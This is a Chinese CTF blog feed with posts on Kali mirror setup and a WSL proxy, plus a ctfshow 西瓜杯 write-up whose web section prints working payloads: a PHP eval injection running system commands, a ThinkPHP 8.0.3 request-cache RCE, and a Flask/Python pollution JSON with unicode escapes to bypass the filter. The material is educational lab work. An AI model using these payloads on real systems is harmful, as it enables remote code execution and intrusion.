  4.<br>      加入以下任意一种国内源即可。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#中科大</span></span><br><span class="line">deb http<span class="punctuation">:</span><span class="comment">//mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span></span><br><span class="line">deb<span class="punctuation">-</span>src http<span class="punctuation">:</span><span class="comment">//mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span></span><br><span class="line"><span class="meta">#阿里云</span></span><br><span class="line">deb http<span class="punctuation">:</span><span class="comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span></span><br><span class="line">deb<span class="punctuation">-</span>src http<span class="punctuation">:</span><span class="comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span></span><br><span class="line"><span class="meta">#清华大学</span></span><br><span class="line">deb http<span class="punctuation">:</span><span class="comment">//mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span></span><br><span class="line">deb<span class="punctuation">-</span>src https<span class="punctuation">:</span><span class="comment">//mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span></span><br><span class="line"><span class="meta">#浙大</span></span><br><span class="line">deb http<span class="punctuation">:</span><span class="comment">//mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span></span><br><span class="line">deb<span class="punctuation">-</span>src http<span class="punctuation">:</span><span class="comment">//mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span></span><br><span class="line"><span class="meta">#东软大学</span></span><br><span class="line">deb http<span class="punctuation">:</span><span class="comment">//mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span></span><br><span class="line">deb<span class="punctuation">-</span>src http<span class="punctuation">:</span><span class="comment">//mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span></span><br><span class="line"><span class="meta">#重庆大学</span></span><br><span class="line">deb http<span class="punctuation">:</span><span class="comment">//http.kali.org/kali kali-rolling main non-free contrib</span></span><br><span class="line">deb<span class="punctuation">-</span>src http<span class="punctuation">:</span><span class="comment">//http.kali.org/kali kali-rolling main non-free contrib</span></span><br></pre></td></tr></table></figure><p>   5.<br>      加入之后点击“ esc ”退出编辑，输入“ :wq”回车保存并退出。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">:wq</span>                     <span class="comment">#保存并退出命令</span></span><br></pre></td></tr></table></figure><p>二.更新命令<br>   输入以下命令以进行更新(在非root状态下需在前面加入“ sudo ”)。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-<span class="built_in">get</span> update          #更新索引</span><br><span class="line">apt-<span class="built_in">get</span><span class="built_in"> upgrade </span>        #更新软件</span><br><span class="line">apt-<span class="built_in">get</span> dist-upgrade    #升级</span><br><span class="line">apt-<span class="built_in">get</span> clean           #删除缓存包</span><br><span class="line">apt-<span class="built_in">get</span> autoclean       #删除未安装的deb包</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows 子系统 WSL使用系统代理</title>
      <link href="/posts/f5bf104a.html"/>
      <url>/posts/f5bf104a.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="WSL-Windows-子系统-WSL使用系统代理"><a href="#WSL-Windows-子系统-WSL使用系统代理" class="headerlink" title="[WSL] Windows 子系统 WSL使用系统代理"></a>[WSL] Windows 子系统 WSL使用系统代理</h1><h2 id="以Ubuntu-Clash为例"><a href="#以Ubuntu-Clash为例" class="headerlink" title="以Ubuntu + Clash为例"></a>以Ubuntu + Clash为例</h2><p>由Jeza Chen 发表于 June 3, 2020</p><p>最近使用WSL发现无法访问github相关的网站，基本都是Connection Refused，即便Windows系统使用了Clash也不能访问，按照网上一些教程，需要在WSL上进行一些配置才能用到系统的代理。</p><p>下面的操作基于WSL下的Ubuntu 20.04 LTS，主机代理软件为<a href="https://github.com/Dreamacro/clash">Clash</a>。</p><ol><li><p>在Clash软件找到HTTP代理端口(即软件里面的Port)，如下图的7890。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/clash-screenshot.png" alt="Clash截图"></p></li><li><p>在c盘的用户文件中创建.wslconfig文件，复制以下代码</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   <span class="section">[experimental]</span></span><br><span class="line">   <span class="attr">autoMemoryReclaim</span>=gradual</span><br><span class="line"><span class="attr">networkingMode</span>=mirrored</span><br><span class="line">   <span class="attr">dnsTunneling</span>=<span class="literal">true</span></span><br><span class="line">   <span class="attr">firewall</span>=<span class="literal">true</span></span><br><span class="line">   <span class="attr">autoProxy</span>=<span class="literal">true</span></span><br></pre></td></tr></table></figure></li><li><p>在WSL的终端上输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.bashrc</span><br></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">，在末行写入</span><br><span class="line"><span class="built_in">export</span> <span class="attribute">http_proxy</span>=127.0.0.1:7890</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> <span class="attribute">https_proxy</span>=127.0.0.1:7890</span><br></pre></td></tr></table></figure></li></ol><p>   <strong>注意这里的7890是上图Clash的HTTP代理端口号，请替换成自己本机的端口。</strong></p><ol><li>关闭终端重新打开，此时输入<code>wget google.com</code>看看代理能不能正常工作。</li></ol><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/wsl-wget-google.png" alt="Wget谷歌官网截图"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow西瓜杯wp</title>
      <link href="/posts/b4e404f6.html"/>
      <url>/posts/b4e404f6.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="ctfshow西瓜杯wp"><a href="#ctfshow西瓜杯wp" class="headerlink" title="ctfshow西瓜杯wp"></a>ctfshow西瓜杯wp</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h4 id="CodeInject"><a href="#CodeInject" class="headerlink" title="CodeInject"></a>CodeInject</h4><blockquote><p>考点：命令执行</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Author: h1xa</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;var_dump((Object)<span class="subst">$_POST</span>[1]);&quot;</span>);</span><br></pre></td></tr></table></figure><blockquote><p>直接构造联合执行。</p><p>payload:</p></blockquote><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>=<span class="number">1</span>);<span class="keyword">system</span>(<span class="string">&#x27;ls /&#x27;</span>); #</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125151729390.png" alt="image-20241125151729390"></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>=<span class="number">1</span>);<span class="keyword">system</span>(<span class="string">&#x27;cat /000f1ag.txt&#x27;</span>); #</span><br></pre></td></tr></table></figure><blockquote><p>ctfshow{729e8c3e-142b-447a-8186-86cdac43b7a1}</p></blockquote><h4 id="tpdoor"><a href="#tpdoor" class="headerlink" title="tpdoor"></a>tpdoor</h4><blockquote><p>考点：thinkphp漏洞</p><p>打开网址发现，就一句话，什么都没有</p><p>先下载源码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">facade</span>\<span class="title">Db</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$middleware</span> = [<span class="string">&#x27;think\middleware\AllowCrossDomain&#x27;</span>,<span class="string">&#x27;think\middleware\CheckRequestCache&#x27;</span>,<span class="string">&#x27;think\middleware\LoadLangPack&#x27;</span>,<span class="string">&#x27;think\middleware\SessionInit&#x27;</span>];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"><span class="variable">$isCache</span> = <span class="literal">false</span> , <span class="variable">$cacheTime</span> = <span class="number">3600</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$isCache</span> == <span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="variable">$config</span> = <span class="keyword">require</span>  <span class="keyword">__DIR__</span>.<span class="string">&#x27;/../../config/route.php&#x27;</span>;</span><br><span class="line">            <span class="variable">$config</span>[<span class="string">&#x27;request_cache_key&#x27;</span>] = <span class="variable">$isCache</span>;</span><br><span class="line">            <span class="variable">$config</span>[<span class="string">&#x27;request_cache_expire&#x27;</span>] = <span class="title function_ invoke__">intval</span>(<span class="variable">$cacheTime</span>);</span><br><span class="line">            <span class="variable">$config</span>[<span class="string">&#x27;request_cache_except&#x27;</span>] = [];</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../../config/route.php&#x27;</span>, <span class="string">&#x27;&lt;?php return &#x27;</span>. <span class="title function_ invoke__">var_export</span>(<span class="variable">$config</span>, <span class="literal">true</span>). <span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;cache is enabled&#x27;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Welcome ,cache is disabled&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>审计发现，在 <code>index</code>路由，有一个 <code>require __DIR__.&#39;/../../config/route.php&#39;</code> 操作，同时后边还会对<code>config/route.php</code>修改，猜测和<code>config/route.php</code>文件有关。可控的值是<code>$config[&#39;request_cache_key&#39;]</code>。</p><p>先根据 thinkphp 的路由规则，访问 /index.php/1，产生报错</p></blockquote><p><img src="upload/image-20241125194710307.png" alt="image-20241125194710307"></p><blockquote><p>发现是tp8.0.3版本</p><p>源审易得: 数据通过竖线分开, 前面为参数, 后面为函数</p><p>根据 thinkphp 的路由规则，访问 <code>/index.php/index/index</code>，能够走到题目给出的<code>Index\index</code>里，然后传递参数<code>isCache</code>和<code>cacheTime</code>。</p><p>然后在 <code>isCache</code>里输入命令，设置<code>cacheTime</code> 为1秒，让cache生效快点，多访问几次，成功RCE</p><p>构造payload:</p></blockquote><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="built_in">index</span>.php/?cacheTime=<span class="number">0</span>&amp;isCache=<span class="keyword">ls</span> /|<span class="built_in">system</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125195017937.png" alt="image-20241125195017937"></p><blockquote><p>/index.php/?cacheTime=0&amp;isCache=cat /000f1ag.txt|system</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125195108938.png" alt="image-20241125195108938"></p><blockquote><p>ctfshow{7d6eab62-7f69-4815-86de-3bb5c8157f41}</p></blockquote><h4 id="easy-polluted"><a href="#easy-polluted" class="headerlink" title="easy_polluted"></a>easy_polluted</h4><blockquote><p>考点：原型链污染</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, redirect, url_for,request,render_template</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_md5</span>():</span><br><span class="line">    random_string = os.urandom(<span class="number">16</span>)</span><br><span class="line">    md5_hash = hashlib.md5(random_string)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> md5_hash.hexdigest()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">user_input</span>):</span><br><span class="line">    blacklisted_patterns = [<span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;global&#x27;</span>, <span class="string">&#x27;env&#x27;</span>, <span class="string">&#x27;app&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;string&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> pattern <span class="keyword">in</span> blacklisted_patterns:</span><br><span class="line">        <span class="keyword">if</span> re.search(pattern, user_input, re.IGNORECASE):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = generate_random_md5()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">evil</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">    session[<span class="string">&quot;username&quot;</span>] = username</span><br><span class="line">    session[<span class="string">&quot;password&quot;</span>] = password</span><br><span class="line">    Evil = evil()</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">filter</span>(<span class="built_in">str</span>(request.data)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            merge(json.loads(request.data), Evil)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">templates</span>():</span><br><span class="line">    username = session.get(<span class="string">&quot;username&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    password = session.get(<span class="string">&quot;password&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> username <span class="keyword">and</span> password:</span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&quot;adminer&quot;</span> <span class="keyword">and</span> password == app.secret_key:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;flag.html&quot;</span>, flag=<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;rt&quot;</span>).read())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Unauthorized&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;Hello,  This is the POLLUTED page.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>审计代码，发现有merge函数，又是flask架构，想到可能有原型链污染。</p><p>可以直接污染静态目录为根目录，但是有过滤[‘init’, ‘global’, ‘env’, ‘app’, ‘_’, ‘string’]</p><p> 但是merge(json.loads(request.data), Evil)中用了json.loads()，所以可以用unicode编码绕过</p></blockquote><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;adminer&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="string">&quot;__init__&quot;</span>: &#123;<span class="string">&quot;__globals__&quot;</span>: &#123;<span class="string">&quot;app&quot;</span>:&#123;<span class="string">&quot;secret_key&quot;</span>: <span class="string">&quot;123&quot;</span>,<span class="string">&quot;_static_folder&quot;</span>:<span class="string">&quot;/&quot;</span>&#125;&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">unicode</span>编码：</span><br><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;adminer&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="string">&quot;\u005f\u005f<span class="char escape_">\u0069</span>\u006e<span class="char escape_">\u0069</span><span class="char escape_">\u0074</span>\u005f\u005f&quot;</span> : &#123;<span class="string">&quot;\u005f\u005f<span class="char escape_">\u0067</span>\u006c\u006f<span class="char escape_">\u0062</span><span class="char escape_">\u0061</span>\u006c<span class="char escape_">\u0073</span>\u005f\u005f&quot;</span> :&#123;<span class="string">&quot;<span class="char escape_">\u0061</span><span class="char escape_">\u0070</span><span class="char escape_">\u0070</span>&quot;</span> :&#123;<span class="string">&quot;<span class="char escape_">\u0073</span><span class="char escape_">\u0065</span><span class="char escape_">\u0063</span><span class="char escape_">\u0072</span><span class="char escape_">\u0065</span><span class="char escape_">\u0074</span>\u005f\u006b<span class="char escape_">\u0065</span><span class="char escape_">\u0079</span>&quot;</span>: <span class="string">&quot;123&quot;</span>,<span class="string">&quot;\u005f<span class="char escape_">\u0073</span><span class="char escape_">\u0074</span><span class="char escape_">\u0061</span><span class="char escape_">\u0074</span><span class="char escape_">\u0069</span><span class="char escape_">\u0063</span>\u005f<span class="char escape_">\u0066</span>\u006f\u006c<span class="char escape_">\u0064</span><span class="char escape_">\u0065</span><span class="char escape_">\u0072</span>&quot;</span>:<span class="string">&quot;\u002f&quot;</span>&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125221629848.png" alt="image-20241125221629848"></p><blockquote><p>访问/static/flag</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125221711073.png" alt="image-20241125221711073"></p><blockquote><p>ctfshow{96d52cff-71d8-4006-b644-32e781527715}</p></blockquote><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h4 id="她说她想结婚"><a href="#她说她想结婚" class="headerlink" title="她说她想结婚"></a>她说她想结婚</h4><blockquote><p>考点：snow隐写，oursecret加密，文件提取，压缩包伪加密，</p><p>下载附件，解压缩，是一张png图片。</p><p>binwalk检测，发现藏了压缩包。提取压缩包</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125204334113.png" alt="image-20241125204334113"></p><blockquote><p>放进010editor,发现全是伪加密。修改09 -&gt; 00</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125204450793.png" alt="image-20241125204450793"></p><blockquote><p>解压后发现有一堆文件，先查看flag.txt。</p><p>直接打开是乱码，放进浏览器打开</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125204542518.png" alt="image-20241125204542518"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125204621739.png" alt="image-20241125204621739"></p><blockquote><p>snow隐写，需要密码，根据hint，密码就是图片上那句话</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125204715554.png" alt="image-20241125204715554"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125204746460.png" alt="image-20241125204746460"></p><blockquote><p>得到一半flag。</p><p>另一半是在png图片里，010中看到了9E 97 BA 2A ,这是oursecret加密</p><p>解密的密码怎么办呢？想想看0~10.txt文件，想到时间戳，提取时间戳后三位，再经过ascii码转换，得到密钥：</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125205149978.png" alt="image-20241125205149978"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125205216350.png" alt="image-20241125205216350"></p><blockquote><p>先将png文件末尾的压缩包数据删去，然后再放进oursecret解密</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125205242468.png" alt="image-20241125205242468"></p><blockquote><p>得到一段base64。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125205007778.png" alt="image-20241125205007778"></p><blockquote><p> 解密得到flag</p><p>ctfshow{W1sh1ng_every0ne_4_happy_time_pl4ying}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow单身杯2024wp</title>
      <link href="/posts/b37bd168.html"/>
      <url>/posts/b37bd168.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="ctfshow单身杯2024wp"><a href="#ctfshow单身杯2024wp" class="headerlink" title="ctfshow单身杯2024wp"></a>ctfshow单身杯2024wp</h1><h2 id="签到·好玩的PHP"><a href="#签到·好玩的PHP" class="headerlink" title="签到·好玩的PHP"></a>签到·好玩的PHP</h2><p>考点：序列化反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">   <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span> </span>&#123;</span><br><span class="line">       <span class="keyword">private</span> <span class="variable">$d</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">       <span class="keyword">private</span> <span class="variable">$s</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">       <span class="keyword">private</span> <span class="variable">$b</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">       <span class="keyword">private</span> <span class="variable">$ctf</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;d = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;d;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;s = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;s;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;b = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;b;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> ((<span class="variable language_">$this</span>-&gt;d != <span class="variable language_">$this</span>-&gt;s) &amp;&amp; (<span class="variable language_">$this</span>-&gt;d != <span class="variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="variable language_">$this</span>-&gt;s != <span class="variable language_">$this</span>-&gt;b)) &#123;</span><br><span class="line">               <span class="variable">$dsb</span> = <span class="variable language_">$this</span>-&gt;d.<span class="variable language_">$this</span>-&gt;s.<span class="variable language_">$this</span>-&gt;b;</span><br><span class="line"></span><br><span class="line">               <span class="keyword">if</span> ((<span class="title function_ 